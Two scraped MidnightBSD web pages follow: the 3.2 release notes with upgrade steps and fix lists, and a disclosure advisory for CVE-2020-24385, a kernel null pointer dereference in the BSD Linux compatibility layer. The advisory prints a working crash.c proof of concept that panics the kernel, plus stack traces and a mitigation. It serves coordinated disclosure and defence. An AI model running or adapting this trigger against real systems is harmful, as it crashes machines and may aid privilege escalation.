=== Content from www.midnightbsd.org_dbe1e50f_20250119_123617.html ===

# [MidnightBSD: The BSD For Everyone](../ "MidnightBSD Home")

* [Home](/)
  + [News](/news/)
  + [Security](/security/)

* [About](/about/)
  + [History](/about/#history)
* [Download](/download/)
  + [Release Notes](/notes/)
  + [Mirror Status](/mirmon/)
  + [App Store](http://app.midnightbsd.org/)

* [Screenshots](/screenshots/)
  + [Screencasts](/screenshots/#screencasts)

* [Community](/community/)
  + [Mailing Lists](/mailman/listinfo/)
  + [Discussions](https://github.com/orgs/MidnightBSD/discussions "GitHub Discussions")
  + [Facebook](https://www.facebook.com/midnightbsd/)
  + [Art Project](/art/)
  + [Donations](/donate/)
  + [Merchandise](https://www.cafepress.com/midnightbsd/17167405)
  + [T-shirts](https://www.teepublic.com/t-shirt/56701250-midnightbsd-os-logo)

* [Developers](/developer/)
  + [OS Bugs](https://github.com/MidnightBSD/src/issues)
  + [mports Bugs](https://github.com/MidnightBSD/mports/issues)
  + [openGrok](http://www.midnightbsd.org/opengrok/)
  + [Magus](/magus/)
  + [Open HUB](https://www.openhub.net/p/mnbsd)

* [Support](/support/)
  + [OS Bugs](https://github.com/MidnightBSD/src/issues)
  + [mports Bugs](https://github.com/MidnightBSD/mports/issues)
  + [Documentation](/documentation/)
  + [Wiki](https://github.com/MidnightBSD/src/wiki)
  + [Manuals](http://man.midnightbsd.org/)
  + [App Store](https://app.midnightbsd.org/)
  + [Mports List](/mports/)
  + [Security Adv DB](https://sec.midnightbsd.org/)

## Release Notes icon MidnightBSD Release Notes

#### Late breaking information:

#### Previous Release Notes

* [0.1-RELEASE](0.1/index.html)
* [0.1.1-RELEASE](0.1.1/index.html)
* [0.2.1-RELEASE](0.2/index.html)
* [0.3-RELEASE](0.3/index.html)
* [0.4-RELEASE](0.4/index.html)
* [0.5-RELEASE](0.5/index.html)
* [0.6-RELEASE](0.6/index.html)
* [0.7-RELEASE](0.7/index.html)
* [0.8-RELEASE](0.8/index.html)
* [1.0-RELEASE](1.0/index.html)
* [1.1-RELEASE](1.1/index.html)
* [1.2-RELEASE](1.2/index.html)
* [2.0-RELEASE](2.0/index.html)
* [2.1-RELEASE](2.1/index.html)
* [2.2-RELEASE](2.2/index.html)
* [3.0-RELEASE](3.0/index.html)
* [3.1-RELEASE](3.1/index.html)
### (07/22/2024) MidnightBSD 3.2

Iâm happy to announce the availability of MidnightBSD 3.2 for amd64 and i386.

This release included updates to third-party libraries, bug fixes from the 3.1 release,
and security updates.
#### Upgrade Process

Install git if you donât have it already

`mport install git`

Fetch MidnightBSD from git via github.com/midnightbsd/src.git (assumes you donât have /usr/src populated)

`git clone -b stable/3.2 https://github.com/MidnightBSD/src.git`

NOTE: some users have experienced build errors on 2.x which require disabling perl in usr.bin/Makefile at the top and
removing camcontrol and df from the rescue/rescue/Makefile temporarily. You can build these once on 3.x.

`cd /usr/src; make -j4 clean buildworld buildkernel;

choose one of etcupdate or mergemaster -p

make installkernel

reboot`

(if it works OK, login and go to /usr/src)

`make installworld

choose one of etcupdate or mergemaster -iU`

Update installed mports/packages

For mport package manager, run
`mport index

mport clean

mport upgrade`

Remove old libraries and programs from the base.

`rm -rf /usr/lib/perl/5.36.1
cd /usr/src/; make check-old; make delete-old; make installworld;`

Perl was removed from base in 3.2. Install from mports or packages via mport install perl5.36

#### Bug Fixes and new features

##### Ravenports

Ravenports is available in MidnightBSD for the amd64 architecture. The initial installation process will
prompt you to bootstrap Ravenports. This will initialize it in /raven/, and you will be able to install
software packages using /raven/sbin/ravensw. By default, /raven/bin, /raven/sbin, and so on are not on the
path. You can add them to the path to make running software in your shell easier. Please visit their
website to learn more about Ravenports and find quickstart guides. <http://www.ravenports.com/>

You can choose either mports or Ravenports at installation time or use packages from both systems.
Please note that mixing packages may have some complications, although they are installed in a completely different place from mports.

There are various benefits to Ravenports, but a few are more updated packages and quite a few unique packages
that mports doesnât provide currently. For example, Ravenports has an updated Firefox package available.

You will not see Ravenports presented as an option on an i386 install.
##### Mport package manager

Updated mport to 2.6.2

##### Miscellaneous Changes

Fixed a bug with portsnap configuration with 3.x releases where it used an old index.

Fix for some vnc clients with bhyve, added com ports to bhyve

Various manual pages cleaned up.

zstd enabled in libarchive

telnetd removed

libfetch: don't rely on ca\_root\_nss for certificate validation

add endian.h for linux compatibility

#### Security Fixes

OpenSSH security vulnerability

OpenSSH 9.3p2 - CVE-2023-38408
Patch for CVE-2023-48795

Fix security issue in libpcap OSV-2020-1231

Fix for wpa supplicant CVE-2023-52160

pf security issue:

#### 3rd Party Software

* Perl removed from base. Install via mports* brainfuck removed from base. Moved to mports
  * Removed subversion from base. install from mports if needed. (use git for MidnightBSD)
  * expat 2.6.2
  * ldns 1.8.3
  * sendmail 8.18.1
  * libarchive 3.7.2
  * zstd 1.5.2
  * Unbound 1.19.3
  * xz / lzma 5.4.5
  * tzdata 2023d
  * mandoc 1.14.6
  * OpenSSH 9.3p2
  * nvi 2.2.1
  * openssl 1.1.1w

#### Hardware

PCI vendors list updated (April 2024)

AMD zen4 temperature sensor support

unbreak Promise RAID1 with 4+ providers

usbdevs: add quirk for WD MyPassport Ultra External HDD

ahci: add AMD KERNCZ (RAID) device id in RAID mode

#### Known Issues

Ravenports install is not in the path, but we also donât tell you that during bootstrap.

On VirtualBox 7, Xorg needs over 1GB of RAM allocated to run without swapping or crashing. Occasional VM hangs have also been seen. It works fine on bare metal, bhyve, or VMware products.

> ---

> [Legal Notices](/legal/) • [Sitemap](/sitemap/) • MidnightBSD
> © 2006-2025 Lucas Holt
>
> Choose Language: [English](/), [EspaÃ±ol](/lang/es/) or [FranÃ§ais](/lang/fr/)



=== Content from www.midnightbsd.org_ac5b6759_20250119_123616.html ===
Null Pointer Dereference Vulnerability in MidnightBSD
CVE-2020-24385
INTRODUCTION
A null pointer dereference vulnerability was found in the latest version of
MidnightBSD (also demonstrated to affect previous versions and to potentially
affect other \*BSDs). The vulnerability happens in the Linux compatibility
subsystem.
This does affect MidnightBSD 1.3-CURRENT and 1.2.x releases.
CVSSv3 Scoring System
The CVSS score is: 7.4
We have used the following values to calculate the scores:
Base score is: AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
Notice that since by default MidnightBSD is not affected, we've considered the
Attack Complexity high (changes have to be made to the system configuration
that are beyond the attacker's control).
DISCLOSURE PROCESS
We are sharing this advisory to the security teams of:
- FreeBSD
- NetBSD
- MidnightBSD
- DragonFlyBSD
Once we hear from all those teams, we plan to update the advisory with more
accurate data (and potentially timelines). At that point we also plan to notify
the OpenBSD security team as well, as a heads-up.
We kindly ask everyone to hold the patches until we hear back from all the
potentially affected BSDs. We intend to have the full cycle of fixes in 90 days,
unless we receive compelling reasons.
TRIGGERING THE PROBLEM
To trigger the problem a PoC file is available in the DETAILS section.
We've tested the trigger code in FreeBSD 12.0-RELEASE and 12.1-RELEASE (both for
AMD64). It requires that the Linux Subsystem support is enabled in the kernel:
kldload linux64
By checking the FreeBSD-current source tree for changes, we believe it is also
affected, but we did not spend additional time reproducing it. We believe that
MidnightBSD and DragonFlyBSD might also be affected, even though the code logic
is slightly different (and will update this advisory once we hear from their
security teams). OpenBSD apparently has removed the Linux Compatibility since
version 6.0, and we did not check if older versions were vulnerable. We've
looked at the NetBSD code and it might also be vulnerable.
Since the end of 2009 [1] FreeBSD has a feature to prevent unprivileged software
from mapping address 0. The feature is disabled by default in FreeBSD 7 and
lower and can be used to prevent exploitation of this issue (for Local Privilege
Escalation). Edit /etc/sysctl.conf and add:
security.bsd.map\_at\_zero="0"
DETAILS
The trigger code is small enough that it fits in the advisory:
----------------- BEGIN crash.c -----------------
#include
#include
#include
pthread\_t t;
void \*s\_routine(void \*arg)
{
sleep(5);
puts("Thread dying... something went wrong if it did not crash by now\n");
puts("did you kdload linux64 and passed a linux binary as input?\n");
}
int main(int agrc, char \*\*argv)
{
pthread\_create(&t, NULL, s\_routine, NULL);
execve(argv[1], argv,NULL);
return 0;
}
----------------- END crash.c -----------------
One just have to compile it with -lpthread and pass as a parameter any Linux
binary (we've used the /bin/ls file from a Debian 10.4-amd64 netinst install).
Here is the stack trace and other useful debug information for FreeBSD 12.0:
$ ./crash linux-ls
Fatal trap 12: page fault while in kernel mode
cpuid = 2; apic id = 02
fault virtual address = 0x20
fault code = supervisor read data, page not present
instruction pointer = 0x20:0xffffffff81c38605
stack pointer = 0x28:0xfffffe00005fe870
frame pointer = 0x28:0xfffffe00005fe8d0
code segment = base 0x0, limit 0xfffff, type 0x1b
= DPL 0, pres 1, long 1, def32 0, gran 1
processor eflags = interrupt enabled, resume, IOPL = 0
current process = 783 (crash)
[ thread pid 783 tid 100119 ]
Stopped at release\_futexes+0x25: movq 0x20(%r14),%rbx
db> bt
Tracing pid 783 tid 100119 td 0xfffff80002e1c000
release\_futexes() at release\_futexes+0x25/frame 0xfffffe00005fe8d0
linux\_thread\_detach() at linux\_thread\_detach+0x21/frame 0xfffffe00005fe920
thread\_suspend\_check() at thread\_suspend\_check+0x424/frame 0xfffffe00005fe970
ast() at ast+0x3b9/frame 0xfffffe00005fe9b0
doreti\_ast() at doreti\_ast+0x1f
And here is the information for FreeBSD 12.1:
Fatal trap 12: page fault while in kernel mode
cpuid = 0; apic id = 00
fault virtual address = 0x18
fault code = supervisor read data, page not present
instruction pointer = 0x20:0xffffffff8283a682
stack pointer = 0x28:0xfffffe00004c3980
frame pointer = 0x28:0xfffffe00004c39e0
code segment = base 0x0, limit 0xfffff, type 0x1b
= DPL 0, pres 1, long 1, def32 0, gran 1
processor eflags = interrupt enabled, resume, IOPL = 0
current process = 868 (crash)
trap number = 12
panic: page fault
cpuid = 0
time = 1591901793
KDB: stack backtrace:
#0 0xffffffff80c1d297 at kdb\_backtrace+0x67
#1 0xffffffff80bd05cd at vpanic+0x19d
#2 0xffffffff80bd0423 at panic+0x43
#3 0xffffffff810a7d2c at trap\_fatal+0x39c
#4 0xffffffff810a7d79 at trap\_pfault+0x49
#5 0xffffffff810a736f at trap+0x29f
#6 0xffffffff81081a0c at calltrap+0x8
#7 0xffffffff8282f3d1 at linux\_thread\_detach+0x21
#8 0xffffffff80be5a6f at thread\_suspend\_check+0x41f
#9 0xffffffff80c32e79 at ast+0x3b9
#10 0xffffffff81084f19 at doreti\_ast+0x1f
Trying to pinpoint the error in the code, we have:
sys/kern/kern\_thread.c:
thread\_suspend\_check() calls linux\_thread\_detach() which calls, one after the other:
em\_find() -> that returns NULL
KASSERT (em != NULL) -> happens only in the non-default conf INVARIANTS
release\_futexes() -> where the NULL de-reference happens
sys/compat/linux/linux\_futex.c:
release\_futexes()
in the very beginning has (without checking em):
head = em->robust\_futexes; (EM is 0) -> NULL DEREF at offset 0x18 (24)
sys/compat/linux/linux\_emul.h:
em\_find() -> returns NULL (because td->td\_emuldata is NULL)
sys/compat/linux/linux\_emul.h:
The em type is a
struct linux\_emuldata {
//Offset:
0 int \*
8 int \*
16 int
20 int
24 struct linux\_robust\_list\_head \*robust\_futexes;
}
The reason why td->td\_emuldata is NULL seems to be because the value is filled at
loading time, but the process that is originating the call is a FreeBSD ELF
(not a Linux one).
Notice that there are multiple other cases of KASSERT (em != NULL) that are
likely reacheable to an attacker as well.
TIMELINE
This timeline will be updated once we start hearing back from the different
teams.
-> Initial disclosure to
FreeBSD/MidnightBSD/DragonFlyBSD/NetBSD -06/16/2020
Patched in MidnightBSD 1.3-CURRENT 08/2020
CREDITS
This vulnerability was discovered and exploited by Paulo Henrique L. Amorim
(Independent Security Researcher) and Rodrigo Rubira Branco (BSDaemon)
(Amazon Web Services).
REFERENCES
[1] FreeBSD Errata. "No zero mapping feature".
Link: https://www.freebsd.org/security/advisories/FreeBSD-EN-09:05.null.asc

